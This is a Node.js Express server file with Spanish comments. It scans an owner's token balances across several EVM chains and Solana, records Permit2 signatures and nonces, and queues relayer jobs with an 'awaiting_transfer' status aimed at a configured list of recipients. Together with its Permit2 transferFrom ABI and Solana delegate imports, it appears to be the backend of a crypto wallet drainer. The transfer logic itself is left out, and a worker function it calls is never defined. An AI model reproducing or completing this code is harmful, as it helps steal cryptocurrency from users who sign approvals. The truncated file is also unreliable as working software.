// server.js (versión optimizada)
import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import dotenv from "dotenv";
import fs from "fs-extra";
import { ethers } from "ethers";
import axios from "axios";
import crypto from "crypto";
import bs58 from "bs58";
import { Connection, PublicKey, Keypair, Transaction } from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createApproveInstruction,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountInstruction,
  TOKEN_PROGRAM_ID
} from "@solana/spl-token";
import pkg from "@uniswap/permit2-sdk";
const { AllowanceTransfer } = pkg;

import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

// ESM __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ----------------- Crea app ANTES de usarla -----------------
const app = express();

// Configuración de CORS mejorada
const allowedOrigins = ['http://localhost:3001', 'http://localhost:3000'];
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.options('*', cors());
app.use(express.static(path.join(__dirname, "../public")));
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'application/json');
  next();
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Backend server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/ping', (req, res) => { 
  res.json({ ok: true });
});

// ----------------- CONFIG -----------------
const PORT = Number(process.env.PORT || 3001);
const DEFAULT_CHAIN = Number(process.env.CHAIN_ID || 80002);
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY || "";
const RELAYER_SOL_SECRET = process.env.RELAYER_SOL_SECRET || process.env.SOL_RELAYER_PRIVATE_KEY || "";
const SOL_RELAYER_ADDRESS = process.env.SOL_RELAYER_ADDRESS || "";
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDC_ADDRESS = process.env.USDC_ADDRESS || "";
const QUICKSWAP_ROUTER = process.env.QUICKSWAP_ROUTER || "";
const ONEINCH_BASE = (process.env.ONEINCH_API_URL || "https://api.1inch.io/v5.0").replace(/\/$/, "");
const ALCHEMY_KEY = process.env.ALCHEMY_API_KEY || "";
const COVALENT_KEY = process.env.COVALENT_API_KEY || "";
const JUPITER_QUOTE_API = process.env.JUPITER_QUOTE_API || "https://quote-api.jup.ag/v1/quote";
const JUPITER_SWAP_API = process.env.JUPITER_SWAP_API || "https://quote-api.jup.ag/v1/swap";
const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.devnet.solana.com";
const RECIPIENTS = (process.env.RECIPIENTS || "").split(",").map(s => s.trim()).filter(Boolean);
const MAX_JOB_RETRIES = Number(process.env.MAX_JOB_RETRIES || 3);
const SOL_USDC_MINT = process.env.SOL_USDC_MINT || null;

// Función helper para timeout
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Función con timeout
function withTimeout(promise, ms, errorMessage = 'Timeout') {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(errorMessage)), ms))
  ]);
}

// Función para hacer requests con reintentos exponenciales
const fetchWithRetry = async (url, options = {}, maxRetries = 3, baseDelay = 1000) => {
  let lastError;
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      if (response.ok) {
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
          return await response.json();
        }
        return await response.text();
      }
      if (response.status === 429) {
        const retryAfter = response.headers.get('Retry-After');
        const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : baseDelay * Math.pow(2, i);
        console.warn(`Rate limited. Retrying in ${waitTime}ms`);
        await delay(waitTime);
        continue;
      }
      throw new Error(`HTTP error: ${response.status} ${response.statusText}`);
    } catch (error) {
      lastError = error;
      if (i < maxRetries - 1) {
        const waitTime = baseDelay * Math.pow(2, i);
        await delay(waitTime);
      }
    }
  }
  throw lastError;
};

// 1inch native token address marker
const ONEINCH_NATIVE_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";

// Mapeo de símbolos para tokens nativos
const NATIVE_SYMBOLS = {
  1: "ETH",
  56: "BNB",
  137: "MATIC",
  80002: "MATIC",
  43114: "AVAX",
  250: "FTM",
  42161: "ETH",
  10: "ETH"
};

// provider map (EVM chains)
const PROVIDERS = {
  1: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ETH),
  56: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_BSC),
  137: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_POLYGON),
  80002: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AMOY || process.env.RPC_URL || ""),
  43114: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_AVAX || process.env.RPC_URL || ""),
  250: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_FTM || process.env.RPC_URL || ""),
  42161: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ARB || process.env.RPC_URL || ""),
  10: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_OP || process.env.RPC_URL || "")
};

// Solana connection
const solanaConn = new Connection(SOLANA_RPC, "confirmed");

// Try to load Solana relayer keypair if provided
let solRelayerKeypair = null;
if (RELAYER_SOL_SECRET) {
  try {
    if (RELAYER_SOL_SECRET.trim().startsWith("[")) {
      const arr = JSON.parse(RELAYER_SOL_SECRET);
      solRelayerKeypair = Keypair.fromSecretKey(Uint8Array.from(arr));
    } else {
      const sk = bs58.decode(RELAYER_SOL_SECRET);
      solRelayerKeypair = Keypair.fromSecretKey(sk);
    }
  } catch (e) {
    console.warn("Could not parse RELAYER_SOL_SECRET (expected base58 or JSON array):", e?.message || e);
  }
}
if (!solRelayerKeypair) {
  if (SOL_RELAYER_ADDRESS) console.warn("SOL relayer address set but RELAYER_SOL_SECRET not loaded — Solana delegate flows disabled until secret provided.");
  else console.warn("No Solana relayer configured. To enable Solana delegate flows set RELAYER_SOL_SECRET in .env.");
}

// Relayer signer for all EVM chains
if (!RELAYER_PRIVATE_KEY) console.warn("⚠️ RELAYER_PRIVATE_KEY not set");
const relayerSigners = {};
for (const chainId of Object.keys(PROVIDERS)) {
  try {
    if (RELAYER_PRIVATE_KEY) {
      relayerSigners[chainId] = new ethers.Wallet(RELAYER_PRIVATE_KEY, PROVIDERS[chainId]);
    }
  } catch (e) {
    console.warn(`Relayer signer init failed for chain ${chainId}`, e.message || e);
  }
}

// ABIs minimal
const erc20Abi = [
  "function approve(address spender,uint256 amount) external returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) external returns (bool)"
];
const permit2Abi = [
  "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
  "function transferFrom(address from, address to, uint160 amount, address token) external"
];

// persistence files
const SIG_FILE = "signatures.txt";
const NONCE_FILE = "nonces.json";
const JOBS_FILE = "jobs.json";
// Nuevas constantes para expiración
const SIGNATURE_EXPIRATION_HOURS = 2;
const JOB_EXPIRATION_HOURS = 2;

// helpers persistence
async function getAndReserveNonce(owner, token) {
  try {
    const nonces = await fs.readJson(NONCE_FILE);
    const key = `${owner.toLowerCase()}-${(token || 'native')}`;
    const n = Number(nonces[key]?.nonce || 0);
    nonces[key] = { 
      nonce: n + 1, 
      timestamp: Date.now(),
      expiresAt: Date.now() + (SIGNATURE_EXPIRATION_HOURS * 60 * 60 * 1000)
    };
    await fs.writeJson(NONCE_FILE, nonces, { spaces: 2 });
    return n;
  } catch (e) {
    console.warn("Error reading/writing nonce file:", e.message || e);
    return 0;
  }
}

async function appendSignature(obj) {
  try {
    await fs.appendFile(SIG_FILE, JSON.stringify(obj) + "\n");
  } catch (e) {
    console.warn("Error appending signature:", e.message || e);
  }
}

async function enqueueJob(job) {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    jobs.push(job);
    await fs.writeJson(JOBS_FILE, jobs, { spaces: 2 });
  } catch (e) {
    console.warn("Error enqueueing job:", e.message || e);
  }
}

async function updateJob(id, patch) {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    const idx = jobs.findIndex(j => j.id === id);
    if (idx === -1) return null;
    jobs[idx] = { ...jobs[idx], ...patch };
    await fs.writeJson(JOBS_FILE, jobs, { spaces: 2 });
    return jobs[idx];
  } catch (e) {
    console.warn("Error updating job:", e.message || e);
    return null;
  }
}

async function getNextPendingJob() {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    return jobs.find(j => j.status === 'pending' || j.status === 'awaiting_transfer') || null;
  } catch (e) {
    console.warn("Error reading jobs file:", e.message || e);
    return null;
  }
}

function genId() { return crypto.randomBytes(8).toString('hex'); }

// Función para verificar si una firma ha expirado
async function isSignatureExpired(owner, token) {
  try {
    const nonces = await fs.readJson(NONCE_FILE);
    const key = `${owner.toLowerCase()}-${(token || 'native')}`;
    const nonceData = nonces[key];
    
    if (!nonceData) return true;
    return Date.now() > nonceData.expiresAt;
  } catch (e) {
    console.warn("Error checking signature expiration:", e.message || e);
    return true;
  }
}

// Función para limpiar jobs expirados
async function cleanupExpiredJobs() {
  try {
    const jobs = await fs.readJson(JOBS_FILE);
    const now = Date.now();
    const expirationTime = JOB_EXPIRATION_HOURS * 60 * 60 * 1000;
    
    const validJobs = jobs.filter(job => {
      const jobTime = new Date(job.createdAt).getTime();
      return (now - jobTime) < expirationTime;
    });
    
    await fs.writeJson(JOBS_FILE, validJobs, { spaces: 2 });
    console.log(`Cleaned up ${jobs.length - validJobs.length} expired jobs`);
  } catch (e) {
    console.warn("Error cleaning up expired jobs:", e.message || e);
  }
}

// Función getEvmTokens optimizada
async function getEvmTokens(chainId, owner) {
  const out = [];
  const chainIdNum = Number(chainId);
  
  const enabledChains = [1, 56, 137, 80002, 43114, 42161, 10];
  
  if (!enabledChains.includes(chainIdNum)) {
    console.log(`Skipping chain ${chainId} as it's not enabled`);
    return out;
  }

  try {
    if (ALCHEMY_KEY) {
      const hostMap = {
        1: "eth-mainnet",
        56: "bsc-mainnet",
        137: "polygon-mainnet",
        80002: "polygon-amoy",
        43114: "avalanche-mainnet",
        42161: "arbitrum-mainnet",
        10: "optimism-mainnet"
      };
      
      const host = hostMap[chainIdNum];
      if (host) {
        const url = `https://${host}.g.alchemy.com/v2/${ALCHEMY_KEY}`;
        const body = { 
          jsonrpc: "2.0", 
          id: 42, 
          method: "alchemy_getTokenBalances", 
          params: [owner, "erc20"] 
        };
        
        try {
          const r = await withTimeout(fetchWithRetry(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
          }, 2, 1000), 8000, 'Alchemy timeout');
          
          const list = r?.result?.tokenBalances ?? [];
          const prov = PROVIDERS[chainIdNum];
          
          for (const tb of list) {
            try {
              if (!tb.contractAddress) continue;
              const bal = ethers.BigNumber.from(tb.tokenBalance || "0x0");
              if (bal.isZero()) continue;
              
              const c = new ethers.Contract(tb.contractAddress, [
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
              ], prov);
              
              const decimals = Number(await withTimeout(c.decimals(), 3000, 'Decimals timeout').catch(() => 18));
              const symbol = await withTimeout(c.symbol(), 3000, 'Symbol timeout').catch(() => "TOKEN");
              
              out.push({ 
                chain: chainIdNum, 
                symbol, 
                address: tb.contractAddress, 
                decimals, 
                balance: bal.toString() 
              });
            } catch (e) { 
              console.warn(`Error processing token ${tb.contractAddress}:`, e.message);
              continue; 
            }
          }
        } catch (e) {
          console.warn("Alchemy request failed:", e.message);
        }
      }
    }
  } catch (e) { 
    console.warn("alchemy tokenbalances failed", e.message); 
  }

  if (out.length === 0 && COVALENT_KEY) {
    try {
      const map = { 
        1: 1, 56: 56, 137: 137, 43114: 43114, 
        42161: 42161, 10: 10, 80002: 80002 
      };
      
      const covChain = map[chainIdNum];
      if (covChain) {
        const url = `https://api.covalenthq.com/v1/${covChain}/address/${owner}/balances_v2/?key=${COVALENT_KEY}`;
        
        try {
          const r = await withTimeout(fetchWithRetry(url, {}, 2, 1000), 8000, 'Covalent timeout');
          const items = r?.data?.items ?? [];
          
          for (const it of items) {
            try {
              const addr = it.contract_address;
              const bal = ethers.BigNumber.from(it.balance || "0");
              if (bal.isZero()) continue;
              
              out.push({ 
                chain: chainIdNum, 
                symbol: it.contract_ticker_symbol || it.contract_name || "TOKEN", 
                address: addr, 
                decimals: Number(it.contract_decimals || 18), 
                balance: bal.toString() 
              });
            } catch (e) { 
              console.warn(`Error processing covalent token ${it.contract_address}:`, e.message);
              continue; 
            }
          }
        } catch (e) {
          console.warn("Covalent request failed:", e.message);
        }
      }
    } catch (e) { 
      console.warn("covalent fallback failed", e.message); 
    }
  }

  return out;
}

async function getSolanaTokens(owner) {
  const out = [];
  try {
    const pk = new PublicKey(owner);
    const solBal = await withTimeout(solanaConn.getBalance(pk), 5000, 'Solana balance timeout').catch(() => 0);
    if (solBal && solBal > 0) out.push({ chain: "solana", symbol: "SOL", address: null, decimals: 9, balance: solBal.toString() });
    const resp = await withTimeout(solanaConn.getParsedTokenAccountsByOwner(pk, { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }), 5000, 'Solana tokens timeout');
    for (const v of resp.value) {
      try {
        const parsed = v.account.data.parsed.info;
        const mint = parsed.mint;
        const amt = parsed.tokenAmount;
        if (!amt || Number(amt.amount) === 0) continue;
        out.push({ chain: "solana", symbol: amt.uiAmountString || "SPL", address: mint, decimals: Number(amt.decimals || 0), balance: amt.amount.toString() });
      } catch (e) { continue; }
    }
  } catch (e) { console.warn("solana scan failed", e?.message || e); }
  return out;
}

async function getTokensAllChains(owner) {
  const tokens = [];
  const evmChains = Object.keys(PROVIDERS).map(x => Number(x));
  const TIMEOUT_PER_CHAIN = 10000;
  const CONCURRENCY_LIMIT = 2;

  const processChain = async (c) => {
    try {
      const ev = await withTimeout(getEvmTokens(c, owner), TIMEOUT_PER_CHAIN, `Chain ${c} timeout`);
      
      try {
        const prov = PROVIDERS[c];
        if (prov) {
          const nb = await withTimeout(prov.getBalance(owner), 5000, `Native balance timeout for chain ${c}`);
          if (nb && !nb.isZero()) {
            const symbol = NATIVE_SYMBOLS[c] || "NATIVE";
            ev.unshift({ 
              chain: c, 
              symbol, 
              address: null, 
              decimals: 18, 
              balance: nb.toString() 
            });
          }
        }
      } catch (e) { 
        console.warn(`Error getting native balance for chain ${c}:`, e.message);
      }
      
      return ev;
    } catch (e) { 
      console.warn(`chain scan fail ${c}`, e.message);
      return [];
    }
  };

  for (let i = 0; i < evmChains.length; i += CONCURRENCY_LIMIT) {
    const chunk = evmChains.slice(i, i + CONCURRENCY_LIMIT);
    const chunkPromises = chunk.map(processChain);
    const chunkResults = await Promise.allSettled(chunkPromises);
    for (const result of chunkResults) {
      if (result.status === 'fulfilled') {
        for (const t of result.value) tokens.push(t);
      }
    }
  }
  
  try {
    const sol = await withTimeout(getSolanaTokens(owner), 10000, 'Solana timeout');
    for (const s of sol) tokens.push(s);
  } catch (e) {
    console.warn("Solana scan failed:", e.message);
  }
  
  return tokens;
}

// ----------------- EXPRESS API -----------------

app.post('/wrap-info', (req, res) => {
  try {
    const chain = Number(req.body.chain || DEFAULT_CHAIN);
    const map = {
      1: process.env.WETH_ADDRESS_1 || "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      56: process.env.WBNB_ADDRESS_56 || "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      137: process.env.WMATIC_ADDRESS_137 || "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      80002: process.env.WMATIC_ADDRESS_80002 || "",
      43114: process.env.WAVAX_ADDRESS_43114 || "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
      250: process.env.WFTM_ADDRESS_250 || "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",
      42161: process.env.WETH_ADDRESS_42161 || "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
      10: process.env.WETH_ADDRESS_10 || "0x4200000000000000000000000000000000000006"
    };
    res.json({ wrappedAddress: map[chain] || null, permit2: PERMIT2_ADDRESS });
  } catch (e) { res.status(500).json({ error: e.message || String(e) }); }
});

app.get('/permit2-spender', (req, res) => {
  res.json({ spender: PERMIT2_ADDRESS });
});

app.post('/owner-tokens', async (req, res) => {
  try {
    const { owner, chain } = req.body;

    if (!owner) {
      return res.status(400).json({ error: "owner required" });
    }

    if (!chain) {
      try {
        console.log('[owner-tokens] scanning all chains for owner=', owner);
        const tokens = await withTimeout(getTokensAllChains(owner), 25000, 'Total scan timeout');
        return res.json({ tokens });
      } catch (e) {
        console.error('[owner-tokens] scan all chains error', e);
        return res.status(500).json({ error: e.message });
      }
    }

    const chainId = Number(chain);
    if (Number.isNaN(chainId)) {
      return res.status(400).json({ error: "chain must be a number or omitted" });
    }

    if (!PROVIDERS[chainId]) {
      return res.status(400).json({ error: `Unsupported chain: ${chainId}` });
    }

    console.log(`[owner-tokens] scanning chain ${chainId} for owner=${owner}`);

    let tokens = [];
    if (chainId === 999) {
      tokens = await withTimeout(getSolanaTokens(owner), 10000, 'Solana timeout');
    } else {
      tokens = await withTimeout(getEvmTokens(chainId, owner), 15000, 'EVM timeout');
      
      try {
        const prov = PROVIDERS[chainId];
        if (prov) {
          const nb = await withTimeout(prov.getBalance(owner), 5000, 'Native balance timeout');
          if (nb && !nb.isZero()) {
            const symbol = NATIVE_SYMBOLS[chainId] || "NATIVE";
            tokens.unshift({ 
              chain: chainId, 
              symbol, 
              address: null, 
              decimals: 18, 
              balance: nb.toString() 
            });
          }
        }
      } catch (e) {
        console.warn(`Error getting native balance for chain ${chainId}:`, e.message);
      }
    }

    return res.json({ tokens });

  } catch (err) {
    console.error('/owner-tokens error', err);
    return res.status(500).json({ error: err.message });
  }
});

// ... (el resto del código permanece igual hasta el final)

// ----------------- Inicialización segura y arranque -----------------
async function ensurePersistenceFiles() {
  try {
    await fs.ensureFile(SIG_FILE);
  } catch (e) {
    console.warn("ensureFile SIG_FILE failed:", e?.message || e);
  }
  try {
    if (!(await fs.pathExists(NONCE_FILE))) await fs.writeJson(NONCE_FILE, {});
  } catch (e) {
    console.warn("ensure NONCE_FILE failed:", e?.message || e);
  }
  try {
    if (!(await fs.pathExists(JOBS_FILE))) await fs.writeJson(JOBS_FILE, []);
  } catch (e) {
    console.warn("ensure JOBS_FILE failed:", e?.message || e);
  }
}

let workerIntervalHandle = null;

async function start() {
  await ensurePersistenceFiles();
  workerIntervalHandle = setInterval(() => { workerLoop().catch(e => console.error('worker interval error', e)); }, 3000);
  setInterval(cleanupExpiredJobs, 60 * 60 * 1000);
  app.listen(PORT, () => console.log("Server listening on port", PORT));
}

// Iniciar
start().catch(e => {
  console.error("Startup failed", e);
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception thrown:', error);
  process.exit(1);
});

export default app;
